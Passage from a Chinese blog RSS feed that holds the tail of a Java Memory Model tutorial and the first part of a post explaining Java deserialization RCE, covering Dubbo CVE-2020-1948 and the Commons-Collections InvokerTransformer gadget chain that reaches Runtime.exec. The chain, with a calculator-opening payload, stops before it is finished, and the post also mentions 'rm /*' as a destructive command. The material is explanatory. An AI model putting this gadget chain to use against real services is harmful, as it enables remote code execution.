&lt;/ul&gt;&lt;p&gt;如果想要把一个变量从主内存复制到工作内存，那就要按顺序执行read和load操作，如果要把变量从工作内存同步回主内存，就要按顺执行store和write操作。&lt;br/&gt;&lt;strong&gt;除此之外Java内存模型还规定了在执行上述8种基本操作时必须满足如下规则&lt;/strong&gt;：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;mark&gt;&lt;strong&gt;不允许read和load、store和write操作之一单独出现，即不允许一个变量从主内存读取了但工作内存不接受，或工作内存发起会写了但主内存不接受的情况出现&lt;/strong&gt;&lt;/mark&gt;。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;不允许一个线程丢弃它最近的assign操作，即变量在工作内存中改变了之后必须把该变化同步回主内存&lt;/strong&gt;。&lt;/li&gt;
&lt;li&gt;&lt;mark&gt;&lt;strong&gt;不允许一个线程无原因地（没有发生任何assign操作）把数据从线程的工作内存同步回主内存中。&lt;/strong&gt;&lt;/mark&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;一个新的变量只能在主内存中“诞生”，不允许在工作内存中直接使用一个未被初始化（load或assign）的变量，换句话说就是对一个变量实施use、store操作之前，必须先执行assign和load操作&lt;/strong&gt;。&lt;/li&gt;
&lt;li&gt;&lt;mark&gt;&lt;strong&gt;一个变量在同一时刻只允许一条线程对其进行lock操作，但lock操作可以被同一条线程重复执行多次，多次执行lock后，只有执行相同次数的unlock操作，变量才会被解锁。&lt;/strong&gt;&lt;/mark&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;如果对一个变量执行lock操作，那将会清空工作内存中此变量的值，在执行引擎使用这个变量前，需要重新执行load或assign操作以初始化变量的值&lt;/strong&gt;。&lt;/li&gt;
&lt;li&gt;&lt;mark&gt;&lt;strong&gt;如果一个变量事先没有被lock操作锁定，那就不允许对它执行unlock操作，也不允许去unlock一个被其他线程锁定的变量&lt;/strong&gt;&lt;/mark&gt;。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;对一个变量执行unlock操作之前，必须先把此变量同步回主内存中（执行store、write操作）&lt;/strong&gt;。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;上面的8中基本操作，以及这些规则限定了Java程序中哪些内存访问操作在并发下是安全的。虽然繁琐但很严谨，大致操作也可以简化的描述为&lt;strong&gt;read、write、lock、unlock&lt;/strong&gt;四种。我们只需要理解Java内存模型的定义即可。&lt;/p&gt;
&lt;h3 id=&quot;对于volatile型变量的特殊规则&quot;&gt;对于volatile型变量的特殊规则&lt;/h3&gt;
&lt;p&gt;关键字volatile可以说是Java虚拟机提供的最轻量级的同步机制，但是它并不容易被正确、完整地理解，Java内存模型为volatile专门定义了一些特殊的访问规则。&lt;br/&gt;当一个变量被定义为volatile之后，它将具备两项特性：&lt;br/&gt;&lt;strong&gt;第一项是保证此变量对所有线程的“&lt;mark&gt;可见性&lt;/mark&gt;”&lt;/strong&gt;，&lt;strong&gt;可见性&lt;/strong&gt;&lt;mark&gt;是指当一条线程修改了这个变量的值，新值对于其他线程来说是可以立即得知的&lt;/mark&gt;。&lt;/p&gt;
&lt;p&gt;关于volatile变量的可见性，虽然volatile变量对所有线程立即可见，但是基于volatile变量的所有的写操作都能立刻反映到其他线程中的。这句话理论上来说没毛病，但是volatile变量在运算过程中也是存在不一致的情况，因为在Java里面的运算操作符并非原子操作，这导致volatile变量的运算在并发下一样是不安全的。&lt;br/&gt;例如：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;/**
 * @author jiomer
 * @date Create in 2020
 * @description volatile变量自增运算测试
 */
public class VolatileOneTest {

    public static volatile int race = 0;

    public static void increase(){
        race++;
    }

    private static final int THREADS_COUNT = 20;

    public static void main(String[] args) {

        Thread[] threads = new Thread[THREADS_COUNT];

        for (int i = 0;i&amp;lt;THREADS_COUNT;i++){

            threads[i] = new Thread(() -&amp;gt; {
                for(int i1 = 0; i1 &amp;lt;10000; i1++){
                    increase();
                }
            });

            threads[i].start();
        }

        while (Thread.activeCount() &amp;gt; 2){
            Thread.yield();
        }

        System.out.println(race);

    }

}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;上述代码发起了20个线程，每个线程对race变量进行10000次自增操作，如果能够正确并发的话，运行结果应为&lt;code&gt;20000&lt;/code&gt;，但运行结果并不正确，并且每次输出结果都小于&lt;code&gt;20000&lt;/code&gt;，且都不相同。&lt;br/&gt;由于volatile变量只能保证可见性，在不符合以下两条规则的运行场景中，我们仍然要通过加锁（&lt;strong&gt;synchronized、java.util.concurent中的锁或原子类&lt;/strong&gt;）来保证原子性：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;mark&gt;&lt;strong&gt;运算结果并不依赖变量的当前值，或者能够确保只有单一的线程修改变量的值&lt;/strong&gt;&lt;/mark&gt;。&lt;/li&gt;
&lt;li&gt;&lt;mark&gt;&lt;strong&gt;变量不需要与其他的状态变量共同参与不变约束&lt;/strong&gt;&lt;/mark&gt;。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;volatile变量的第二项特性是：&lt;mark&gt;&lt;strong&gt;禁止指令重排序优化&lt;/strong&gt;&lt;/mark&gt;。&lt;strong&gt;普通的变量金辉保证在该方法的执行过程中所有依赖复制结果的地方都能获取到正确的结果，而不能保证变量赋值操作的顺序与程序代码中的执行顺序一致。&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&quot;针对long和double型变量的特殊规则&quot;&gt;针对long和double型变量的特殊规则&lt;/h3&gt;
&lt;p&gt;上面在介绍Java内存模型的内存交互操作时，介绍了8种操作并明确都是具有原子性的。&lt;br/&gt;但是对于64位的数据类型（long和double），在模型中特别定义了一条宽松的规定：&lt;mark&gt;允许虚拟机将没有被volatile修饰的64位数据的读写操作划分为两次32位的操作来进行，即允许虚拟机自行选择是否要保证64位数据类型的load、store、read、和write这四个操作的原子性，这就是所谓的“&lt;strong&gt;long 和 double的非原子协定&lt;/strong&gt;”。&lt;/mark&gt;&lt;br/&gt;从JDK9开始，HotSpot增加了一个实验性的参数-XX:+AlwaysAtomicAccesses 来约束虚拟机堆所有数据类型进行原子性的访问。另外由于现代中央处理器中一般都包含专门用于处理浮点数据的浮点运算器，所以在实际开发中，除非该数据有明确可知的线程竞争，否则一般不用刻意的把long和double类型的变量声明为volatile。&lt;/p&gt;
&lt;h3 id=&quot;原子性、可见性、有序性&quot;&gt;原子性、可见性、有序性&lt;/h3&gt;
&lt;p&gt;Java内存模型是围绕着在并发过程中如何处理&lt;mark&gt;原子性&lt;/mark&gt;、&lt;mark&gt;可见性&lt;/mark&gt;和&lt;mark&gt;有序性&lt;/mark&gt;这三个特征来建立的。&lt;/p&gt;
&lt;h4 id=&quot;原子性&quot;&gt;原子性&lt;/h4&gt;
&lt;p&gt;由Java内存模型来直接保证的原子性变量操作包括&lt;code&gt;read&lt;/code&gt;、&lt;code&gt;load&lt;/code&gt;、&lt;code&gt;assign&lt;/code&gt;、&lt;code&gt;use&lt;/code&gt;、&lt;code&gt;store&lt;/code&gt;和&lt;code&gt;write&lt;/code&gt;这六个，我们大致可以认为，基本数据类型的访问、读写都是具备原子性的。&lt;br/&gt;如果需要一个更大范围的原子性保证，Java内存模型还提供了&lt;code&gt;lock&lt;/code&gt;和&lt;code&gt;unlock&lt;/code&gt;操作来满足这种需求，这两个操作更高层次的字节码指令是&lt;code&gt;monitorenter&lt;/code&gt;和&lt;code&gt;monitorexit&lt;/code&gt;来隐式地使用这两个操作。这两个操作反应到Java代码中就是&lt;code&gt;synchronized&lt;/code&gt;关键字，所以&lt;code&gt;synchronized&lt;/code&gt;代码块之间的操作也具备原子性。&lt;/p&gt;
&lt;h4 id=&quot;可见性&quot;&gt;可见性&lt;/h4&gt;
&lt;p&gt;可见性就是指当一个线程修改了共享变量值时，其他线程能够立即得知这个修改。Java内存模型是通过在变量修改后将新值同步回主内存，在变量读取前从主内存刷新变量这种依赖主内存作为传递媒介的方式来实现可见性，无论是普通变量还是volatile变量都是如此。区别就在于volatile的特殊规则保证了新值能立即同步到主内存，以及每次使用前立即从主内存刷新。&lt;/p&gt;
&lt;p&gt;除了volatile之外，Java还有两个关键字能实现可见性，他们是&lt;code&gt;synchronized&lt;/code&gt;和&lt;code&gt;final&lt;/code&gt;。&lt;mark&gt;&lt;code&gt;synchronized&lt;/code&gt;的可见性是由“对一个变量执行unlock操作之前，必须先把此变量同步回主内存中（执行store、write操作）”这条规则获得的&lt;/mark&gt;。&lt;br/&gt;final关键字的可见性是指：被final修饰的字段在构造器中一旦被初始化完成，并且构造器没有吧“this”的引用传递出去，那么在其他线程中就能看见final字段值。&lt;/p&gt;
&lt;h4 id=&quot;有序性&quot;&gt;有序性&lt;/h4&gt;
&lt;p&gt;Java程序中的有序性可以总结为一句话：&lt;mark&gt;如果在本线程内观察，所有的操作都是有序的；如果在一个线程中观察另一个线程，所有的操作都是无序的。&lt;/mark&gt;&lt;br/&gt;Java语言提供了&lt;code&gt;volatile&lt;/code&gt;和&lt;code&gt;synchronized&lt;/code&gt;两个关键字拉保证线程之间操作的有序性，&lt;code&gt;volatile&lt;/code&gt;关键字本身就包含了禁止指令重排序的语义，而&lt;code&gt;synchronized&lt;/code&gt;则是由“&lt;mark&gt;一个变量在同一时刻只允许一条线程对其进行lock操作&lt;/mark&gt;”这条规则获得的，这个规则决定了持有同一个锁的两个同步块只能串行地进入。&lt;/p&gt;
&lt;h3 id=&quot;先行发生原则（happens-before）&quot;&gt;先行发生原则（Happens-Before）&lt;/h3&gt;
&lt;p&gt;Java语言中有一个“先行发生”（Happens-Before）的原则。这个原则非常重要，它是判断数据是否存在竞争，线程是否安全的非常有用的手段。&lt;br/&gt;&lt;mark&gt;&lt;strong&gt;先行发生原则是Java内存模型中定义的两项操作之间的偏序关系，例如操作A先行发生于操作B，其实就是说在发生操作B之前，操作A产生的影响能被操作B观察到，“影响”包括修改了内存中共享变量的值、发送了消息、调用了方法等。&lt;/strong&gt;&lt;/mark&gt;&lt;/p&gt;
&lt;p&gt;下面几项规则是Java内存模型中“天然的”先行发生关系，可以直接在代码中使用。如果两个操作之间的关系不在此列，并且无法从下列规则推导出来，则它们就没有顺序性保障，虚拟机可以对它们随意地进行重排序。&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;strong&gt;程序次序规则&lt;/strong&gt;：在一个线程内，安装控制流顺序，书写在前面的操作先行发生于书写在后面的操作。（这里说的是控制流顺序，不是程序代码顺序，因为要考虑分支、循环等）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;管程锁定规则&lt;/strong&gt;：一个unlock操作先行发生于后面对同一个锁的lock操作。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;volatile变量规则&lt;/strong&gt;：对一个volatile变量的写操作先行发生于后面对这个变量的读操作，这里的“后面”同样是指时间上的先后。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;线程启动规则&lt;/strong&gt;：Thread对象的start()方法先行发生于此线程的每一个动作。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;线程终止规则&lt;/strong&gt;：线程中所有操作都先行发生于对此线程的终止检测，我们可以通过Thread::join()方法是否结束、Thread::isAlive()的返回值等手段检测线程是否已经终止执行。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;线程中断规则&lt;/strong&gt;：对线程interrupt()方法的调用先行发生于被中断线程的代码检测到中断事件发生，可以通过Thread::interrupted()方法检测到是否有中断发生。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;对象终结规则&lt;/strong&gt;：一个对象的初始化完成（构造函数执行结束）先行发生于它的finalize()方法开始。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;传递性&lt;/strong&gt;：如果操作A先行发生于操作B，操作B先行发生于操作C，那就可以得出操作A先行发生于操作C的结论。&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;举个例子说明如何判断操作间是否具备顺序性，对于读写共享变量的操作来说，就是线程是否安全。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public class HappensBeforeTest {
    
    
    private int item = 1;


    public int getItem() {
        return item;
    }

    public void setItem(int item) {
        this.item = item;
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;上面的代码，假设线程A（时间上的先后）先调用了&lt;code&gt;setItem(2)&lt;/code&gt;，然后线程B调用了同一个对象的&lt;code&gt;getItem()&lt;/code&gt;。&lt;br/&gt;先分析一下，由于两个方法不在一个线程中，所以&lt;mark&gt;程序次序规则&lt;/mark&gt;不适用；没有同步块，所以管程锁定规则也不适用；item没有被volatile关键字修饰，所以volatile变量规则不适用；后面的线程启动、终止、中断规则和对象终结规则也和这没关系。因为之前也没有一个适用的先行发生规则，所以也没有传递性规则；&lt;br/&gt;所以我们判定，尽管线程A操作时间上先于线程B，但是无法确定线程B中getItem()方法的返回结果，也就是这里面的操作不是线程安全的。&lt;/p&gt;
&lt;p&gt;修复方式有多种，例如把getter/setter方法都加上synchronized，这样符合管程锁定规则；要么把item设置成volatile变量；要么等setter方法执行完成后再指向getter方法，符合程序次序规则。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;既然一个操作在“时间上的先发生”不代表这个操作会是“先行发生”。&lt;/strong&gt;那么一个操作“先行发生”是否就能推导出这个操作必定是“时间上的先行发生”呢？&lt;/p&gt;
&lt;p&gt;还是举例说明吧&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;       // 以下操作在同一个线程中执行
    int item = 1;

    int value = 2;
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;根据程序次序规则，&lt;code&gt;int item = 1;&lt;/code&gt;的操作先行发生于&lt;code&gt;int value = 2;&lt;/code&gt;，但是&lt;code&gt;int value = 2;&lt;/code&gt;的代码完全可能先被处理器执行，这并不影响先行发生原则的正确性。&lt;/p&gt;
&lt;p&gt;所以经过上面两个论证，得出&lt;mark&gt;&lt;strong&gt;时间先后顺序与先行发生原则之间基本没有因果关系&lt;/strong&gt;&lt;/mark&gt;，在衡量是否线程安全时，一切必须以先行发生原则为准。&lt;/p&gt;
</description>
<pubDate>Thu, 09 Jul 2020 00:13:00 +0000</pubDate>
<dc:creator>纪莫</dc:creator>
<og:description>前言 Java内存模型（Java Memory Model）用来屏蔽各种硬件和操作系统的内存访问差异，这使得Java能够变得非常灵活而不用考虑各系统间的兼容性等问题。定义Java内存模型并非一件容易的</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/jimoer/p/13270409.html</dc:identifier>
</item>
<item>
<title>Dubbo 高危漏洞！原来都是反序列化惹得祸 - 楼下小黑哥</title>
<link>http://www.cnblogs.com/goodAndyxublog/p/13270411.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/goodAndyxublog/p/13270411.html</guid>
<description>&lt;h2 id=&quot;前言&quot;&gt;前言&lt;/h2&gt;
&lt;p&gt;这周收到外部合作同事推送的一篇文章，&lt;a href=&quot;https://mp.weixin.qq.com/s/iKQbdWrMG00Arg0aEUbrXQ&quot;&gt;【漏洞通告】Apache Dubbo Provider默认反序列化远程代码执行漏洞（CVE-2020-1948）通告&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;按照文章披露的漏洞影响范围，可以说是当前所有的 Dubbo 的版本都有这个问题。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1419561/202007/1419561-20200709081029700-1420107042.jpg&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;无独有偶，这周在 Github 自己的仓库上推送几行改动，不一会就收到 Github 安全提示，警告当前项目存在安全漏洞&lt;a href=&quot;https://github.com/advisories/GHSA-mvr2-9pj6-7w5j&quot;&gt;CVE-2018-10237&lt;/a&gt;。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1419561/202007/1419561-20200709081029888-1609834564.jpg&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;可以看到这两个漏洞都是利用反序列化进行执行恶意代码，可能很多同学跟我当初一样，看到这个一脸懵逼。好端端的反序列化，怎么就能被恶意利用，用来执行的恶意代码?&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1419561/202007/1419561-20200709081030284-816710555.jpg&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;这篇文章我们就来聊聊反序列化漏洞，了解一下黑客是如何利用这个漏洞进行攻击。&lt;/p&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;&lt;strong&gt;先赞后看，养成习惯！微信搜索『程序通事』，关注就完事了！&lt;/strong&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;反序列化漏洞&quot;&gt;反序列化漏洞&lt;/h2&gt;
&lt;p&gt;在了解反序列化漏洞之前，首先我们学习一下两个基础知识。&lt;/p&gt;
&lt;h3 id=&quot;java-运行外部命令&quot;&gt;Java 运行外部命令&lt;/h3&gt;
&lt;p&gt;Java 中有一个类 &lt;code&gt;Runtime&lt;/code&gt;，我们可以使用这个类执行执行一些外部命令。&lt;/p&gt;
&lt;p&gt;下面例子中我们使用 &lt;code&gt;Runtime&lt;/code&gt; 运行打开系统的计算器软件。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;// 仅适用macos 
Runtime.getRuntime().exec(&quot;open -a Calculator &quot;);
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;有了这个类，恶意代码就可以执行外部命令，比如执行一把 &lt;code&gt;rm /*&lt;/code&gt;。&lt;/p&gt;
&lt;h3 id=&quot;序列化反序列化&quot;&gt;序列化/反序列化&lt;/h3&gt;
&lt;p&gt;如果经常使用 Dubbo，Java 序列化与反序列化应该不会陌生。&lt;/p&gt;
&lt;p&gt;一个类通过实现 &lt;code&gt;Serializable&lt;/code&gt;接口，我们就可以将其序列化成二进制数据，进而存储在文件中，或者使用网络传输。&lt;/p&gt;
&lt;p&gt;其他程序可以通过网络接收，或者读取文件的方式，读取序列化的数据，然后对其进行反序列化,从而反向得到相应的类的实例。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1419561/202007/1419561-20200709081030505-83795350.jpg&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;下面的例子我们将 &lt;code&gt;App&lt;/code&gt; 的对象进行序列化，然后将数据保存到的文件中。后续再从文件中读取序列化数据，对其进行反序列化得到 &lt;code&gt;App&lt;/code&gt; 类的对象实例。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public class App implements Serializable {

    private String name;

    private static final long serialVersionUID = 7683681352462061434L;


    private void readObject(java.io.ObjectInputStream in) throws IOException, ClassNotFoundException {
        in.defaultReadObject();
        System.out.println(&quot;readObject name is &quot;+name);
        Runtime.getRuntime().exec(&quot;open -a Calculator&quot;);
    }

    public static void main(String[] args) throws IOException, ClassNotFoundException {
        App app = new App();
        app.name = &quot;程序通事&quot;;

        FileOutputStream fos = new FileOutputStream(&quot;test.payload&quot;);
        ObjectOutputStream os = new ObjectOutputStream(fos);
        //writeObject()方法将Unsafe对象写入object文件
        os.writeObject(app);
        os.close();
        //从文件中反序列化obj对象
        FileInputStream fis = new FileInputStream(&quot;test.payload&quot;);
        ObjectInputStream ois = new ObjectInputStream(fis);
        //恢复对象
        App objectFromDisk = (App)ois.readObject();
        System.out.println(&quot;main name is &quot;+objectFromDisk.name);
        ois.close();
    }
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;执行结果：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-log&quot;&gt;readObject name is 程序通事
main name is 程序通事
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;并且成功打开了计算器程序。&lt;/p&gt;
&lt;p&gt;当我们调用 &lt;code&gt;ObjectInputStream#readObject&lt;/code&gt;读取反序列化的数据，如果对象内实现了 &lt;code&gt;readObject&lt;/code&gt;方法，这个方法将会被调用。&lt;/p&gt;
&lt;p&gt;源码如下：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1419561/202007/1419561-20200709081030750-865499854.jpg&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;h3 id=&quot;反序列化漏洞执行条件&quot;&gt;反序列化漏洞执行条件&lt;/h3&gt;
&lt;p&gt;上面的例子中，我们在 &lt;code&gt;readObject&lt;/code&gt; 方法内主动使用&lt;code&gt;Runtime&lt;/code&gt;执行外部命令。但是正常的情况下，我们肯定不会在 &lt;code&gt;readObject&lt;/code&gt;写上述代码，除非是内鬼￣□￣｜｜&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1419561/202007/1419561-20200709081030905-1270838664.jpg&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;如果可以找到一个对象，他的&lt;code&gt;readObject&lt;/code&gt;方法可以执行任意代码，那么在反序列过程也会执行对应的代码。我们只要将满足上述条件的对象序列化之后发送给先相应 Java 程序，Java 程序读取之后，进行反序列化，就会执行指定的代码。&lt;/p&gt;
&lt;p&gt;为了使反序列化漏洞成功执行需要满足以下条件：&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;Java 反序列化应用中需要&lt;strong&gt;存在序列化使用的类&lt;/strong&gt;，不然反序列化时将会抛出 &lt;code&gt;ClassNotFoundException&lt;/code&gt; 异常。&lt;/li&gt;
&lt;li&gt;Java 反序列化对象的 &lt;code&gt;readObject&lt;/code&gt;方法可以执行任何代码，没有任何验证或者限制。&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;引用一段网上的反序列化攻击流程,来源：&lt;a href=&quot;https://xz.aliyun.com/t/7031&quot;&gt;https://xz.aliyun.com/t/7031&lt;/a&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;ol&gt;&lt;li&gt;客户端构造payload(有效载荷)，并进行一层层的封装，完成最后的exp（exploit-利用代码）&lt;/li&gt;
&lt;li&gt;exp发送到服务端，进入一个服务端自主复写（也可能是也有组件复写）的readobject函数，它会反序列化恢复我们构造的exp去形成一个恶意的数据格式exp_1（剥去第一层）&lt;/li&gt;
&lt;li&gt;这个恶意数据exp_1在接下来的处理流程(可能是在自主复写的readobject中、也可能是在外面的逻辑中)，会执行一个exp_1这个恶意数据类的一个方法，在方法中会根据exp_1的内容进行函处理，从而一层层地剥去（或者说变形、解析）我们exp_1变成exp_2、exp_3......&lt;/li&gt;
&lt;li&gt;最后在一个可执行任意命令的函数中执行最后的payload，完成远程代码执行。&lt;/li&gt;
&lt;/ol&gt;&lt;/blockquote&gt;
&lt;h2 id=&quot;common-collections&quot;&gt;Common-Collections&lt;/h2&gt;
&lt;p&gt;下面我们以 &lt;code&gt;Common-Collections&lt;/code&gt; 的存在反序列化漏洞为例，来复现反序列化攻击流程。&lt;/p&gt;
&lt;p&gt;首先我们在应用内引入 &lt;code&gt;Common-Collections&lt;/code&gt; 依赖，这里需要注意，我们需要引入 &lt;strong&gt;3.2.2&lt;/strong&gt; 版本之前，之后的版本这个漏洞已经被修复。&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;&amp;lt;dependency&amp;gt;
    &amp;lt;groupId&amp;gt;commons-collections&amp;lt;/groupId&amp;gt;
    &amp;lt;artifactId&amp;gt;commons-collections&amp;lt;/artifactId&amp;gt;
    &amp;lt;version&amp;gt;3.1&amp;lt;/version&amp;gt;
&amp;lt;/dependency&amp;gt;
&lt;/code&gt;
&lt;/pre&gt;
&lt;blockquote readability=&quot;5&quot;&gt;
&lt;p&gt;PS:下面的代码只有在 JDK7 环境下执行才能复现这个问题。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;首先我们需要明确，我们做一系列目的就是为了让应用程序成功执行 &lt;code&gt;Runtime.getRuntime().exec(&quot;open -a Calculator&quot;)&lt;/code&gt;。&lt;/p&gt;
&lt;p&gt;当然我们没办法让程序直接运行上述语句，我们需要借助其他类，间接执行。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Common-Collections&lt;/code&gt;存在一个 &lt;code&gt;Transformer&lt;/code&gt;，可以将一个对象类型转为另一个对象类型，相当于 &lt;strong&gt;Java Stream&lt;/strong&gt; 中的 &lt;code&gt;map&lt;/code&gt; 函数。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Transformer&lt;/code&gt;有几个实现类：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;code&gt;ConstantTransformer&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;InvokerTransformer&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;ChainedTransformer&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;其中 &lt;code&gt;ConstantTransformer&lt;/code&gt;用于将对象转为一个常量值，例如：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;Transformer transformer = new ConstantTransformer(&quot;程序通事&quot;);
Object transform = transformer.transform(&quot;楼下小黑哥&quot;);
// 输出对象为 程序通事
System.out.println(transform);
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;InvokerTransformer&lt;/code&gt;将会使用反射机制执行指定方法，例如：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;Transformer transformer = new InvokerTransformer(
        &quot;append&quot;,
        new Class[]{String.class},
        new Object[]{&quot;楼下小黑哥&quot;}
);
StringBuilder input=new StringBuilder(&quot;程序通事-&quot;);
// 反射执行了 input.append(&quot;楼下小黑哥&quot;);
Object transform = transformer.transform(input);
// 程序通事-楼下小黑哥
System.out.println(transform);
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;ChainedTransformer&lt;/code&gt; 需要传入一个 &lt;code&gt;Transformer[]&lt;/code&gt;数组对象，使用责任链模式执行的内部 &lt;code&gt;Transformer&lt;/code&gt;，例如：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;Transformer[] transformers = new Transformer[]{
        new ConstantTransformer(Runtime.getRuntime()),
        new InvokerTransformer(
                &quot;exec&quot;,
                new Class[]{String.class}, new Object[]{&quot;open -a Calculator&quot;})
};

Transformer chainTransformer = new ChainedTransformer(transformers);
chainTransformer.transform(&quot;任意对象值&quot;);
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;通过 &lt;code&gt;ChainedTransformer&lt;/code&gt; 链式执行 &lt;code&gt;ConstantTransformer&lt;/code&gt;，&lt;code&gt;InvokerTransformer&lt;/code&gt;逻辑，最后我们成功的运行的 &lt;code&gt;Runtime&lt;/code&gt;语句。&lt;/p&gt;
&lt;p&gt;不过上述的代码存在一些问题，&lt;code&gt;Runtime&lt;/code&gt;没有继承 &lt;code&gt;Serializable&lt;/code&gt;接口，我们无法将其进行序列化。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1419561/202007/1419561-20200709081031189-842968932.jpg&quot; alt=&quot;&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;如果对其进行序列化程序将会抛出异常：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;https://img2020.cnblogs.com/other/1419561/202007/1419561-20200709081031321-459282284.jpg&quot; alt=&quot;image-20200705123341395&quot; loading=&quot;lazy&quot;/&gt;&lt;/p&gt;
&lt;p&gt;我们需要改造以上代码，使用 &lt;code&gt;Runtime.class&lt;/code&gt; 经过一系列的反射执行：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;String[] execArgs = new String[]{&quot;open -a Calculator&quot;};

final Transformer[] transformers = new Transformer[]{
        new ConstantTransformer(Runtime.class),
        new InvokerTransformer(
                &quot;getMethod&quot;,
                new Class[]{String.class, Class[].class},
                new Object[]{&quot;getRuntime&quot;, new Class[0]}
        ),
        new InvokerTransformer(
                &quot;invoke&quot;,
                new Class[]{Object.class, Object[].class},
                new Object[]{null, new Object[0]}
        ),
        new InvokerTransformer(
                &quot;exec&quot;,
                new Class[]{String.class}, execArgs),
};
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;刚接触这块的同学的应该已经看晕了吧，没关系，我将上面的代码翻译一下正常的反射代码一下：&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;((Runtime) Runtime.class.
        getMethod(&quot;getRuntime&quot;, null).
        invoke(null, null)).
        exec(&quot;open -a Calculator&quot;);
&lt;/code&gt;
&lt;/pre&gt;
&lt;h3 id=&quot;transformedmap&quot;&gt;TransformedMap&lt;/h3&gt;
&lt;p&gt;接下来我们需要找到相关类，可以自动调用&lt;code&gt;Transformer&lt;/code&gt;内部方法。&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Common-Collections&lt;/code&gt;内有两个类将会调用 &lt;code&gt;Transformer&lt;/code&gt;：&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;&lt;code&gt;TransformedMap&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;LazyMap&lt;/code&gt;&lt;/li&gt;
